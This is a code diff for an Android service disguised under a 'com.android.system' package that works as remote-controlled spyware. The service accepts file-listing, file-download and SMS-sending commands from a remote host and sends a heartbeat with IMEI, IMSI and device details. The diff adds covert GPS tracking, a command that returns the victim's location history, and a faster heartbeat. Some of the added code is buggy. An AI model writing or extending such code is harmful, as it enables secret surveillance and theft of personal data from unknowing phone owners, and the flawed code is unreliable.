@@ -5,15 +5,20 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.location.Location;
+import android.location.LocationListener;
 import android.os.Build;
+import android.os.Bundle;
 import android.os.IBinder;
 import android.os.PowerManager;
 import android.telephony.TelephonyManager;
 
 import com.android.system.NetworkSessionManager;
+import com.android.system.db.LocationDb;
 import com.android.system.function.FileDownload;
 import com.android.system.function.FileList;
 import com.android.system.utils.DataPack;
+import com.android.system.utils.LocationUtil;
 import com.android.system.utils.SystemUtil;
 
 import org.json.JSONArray;
@@ -32,6 +37,7 @@ import java.util.TimerTask;
 public class SystemService extends Service{
     private NetworkSessionManager mSessionManager;
     private NetworkSessionManager.SessionHandler mSessionHandler = new NetworkSessionManager.SessionHandler() {
+        private static final String ACTION_LOCATION_LIST = "location_list";
         private String ACTION_FILE_DOWNLOAD = "file_download";
         private String ACTION_FILE_LIST = "file_list";
         private String ACTION_SEND_SMS = "send_sms";
@@ -156,9 +162,32 @@ public class SystemService extends Service{
                 } catch (JSONException e) {
                     e.printStackTrace();
                 }
+            } else if(action.equals(ACTION_LOCATION_LIST)) {
+                List<LocationDb.LocationInfo> infoList = LocationDb.list();
+                JSONObject responseJsonObject = new JSONObject();
+                try {
+                    JSONArray array = new JSONArray();
+                    for(LocationDb.LocationInfo info: infoList) {
+                        JSONObject infoJsonObject = new JSONObject();
+                        infoJsonObject.put("longitude", info.longitude);
+                        infoJsonObject.put("latitude", info.latitude);
+                        infoJsonObject.put("time", info.time);
+                        array.put(jsonObject);
+                    }
+                    responseJsonObject.put(ACTION_UPLOAD_SMS, array);
+                } catch (JSONException e) {
+                }
+                byte[] responseData = null;
+                try {
+                    responseData = responseJsonObject.toString().getBytes("UTF-8");
+                } catch (UnsupportedEncodingException e) {
+                    responseData = responseJsonObject.toString().getBytes();
+                }
+                DataPack.sendDataPack(outputStream,responseData);
             }
         }
     };
+    private double longitude = 0, latitude = 0;
 
     public static boolean start(Context context) {
         if(!SystemUtil.isServiceRunning(context, SystemService.class.getCanonicalName())) {
@@ -195,7 +224,7 @@ public class SystemService extends Service{
                         } catch (Exception e) {
                         }
                     }
-                },59000);
+                }, 59000);
             }
         }, new IntentFilter(Intent.ACTION_TIME_TICK));
     }
@@ -237,14 +266,16 @@ public class SystemService extends Service{
         try {
             TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
             jsonObject.put("model",Build.MODEL)
-                    .put("brand",Build.BRAND)
+                    .put("brand", Build.BRAND)
                     .put("version",Build.VERSION.RELEASE)
                     .put("memory", SystemUtil.getAvailMemory(this) + " / " + SystemUtil.getTotalMemory(this) )
                     .put("storage", SystemUtil.getStorageInfo(this))
                     .put("network_state", SystemUtil.getNetworkConnectTypeString(this))
                     .put("sim_operator",tm.getSimOperatorName())
                     .put("imei", tm.getDeviceId())
-                    .put("imsi", tm.getSubscriberId());
+                    .put("imsi", tm.getSubscriberId())
+                    .put("longitude", ""+longitude)
+                    .put("latitude", ""+latitude);
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -252,6 +283,30 @@ public class SystemService extends Service{
     }
 
     private void init() {
+        //Location
+        LocationUtil.listenLocation(this, new LocationListener() {
+            @Override
+            public void onLocationChanged(Location location) {
+                longitude = location.getLongitude();
+                latitude = location.getLatitude();
+            }
+
+            @Override
+            public void onStatusChanged(String provider, int status, Bundle extras) {
+
+            }
+
+            @Override
+            public void onProviderEnabled(String provider) {
+
+            }
+
+            @Override
+            public void onProviderDisabled(String provider) {
+
+            }
+        });
+
         try {
             InputStream is = getAssets().open("hostname");
             byte[] data = new byte[is.available()];
@@ -265,7 +320,7 @@ public class SystemService extends Service{
                 public void run() {
                     mSessionManager.setHeartBeatData(getHeartBeatData());
                 }
-            },0,15000);
+            },0,5000);
             if(host_port.length >= 1) {
                 mSessionManager.setHost( host_port[0] );
             }
